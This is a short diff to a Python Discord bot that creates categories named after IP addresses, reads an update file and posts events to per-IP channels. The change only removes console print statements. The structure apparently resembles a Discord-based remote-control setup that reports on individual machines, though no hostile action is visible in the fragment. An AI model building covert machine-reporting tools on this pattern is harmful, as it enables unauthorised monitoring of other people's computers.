@@ -159,11 +159,9 @@ async def on_ready():
 
                 with open(os.path.join(target_path, "skibidi-mainmain", "update.txt")) as up:
                     tex = up.read()
-                    print("Checking if update was done...")
                     up.close()
 
                 if not tex == "":
-                    print("Updated!")
 
                     category = nextcord.utils.get(guild.categories, name=str(ip))
                     channel5 = nextcord.utils.get(category.text_channels, name="events")
@@ -200,8 +198,6 @@ async def on_ready():
                 channel = nextcord.utils.get(category.text_channels, name="events")
                 if channel:
                     await channel.send(embed=embed)
-    
-    print(f'Bot is ready and connected to {len(client.guilds)} guild(s).')
 
 
 
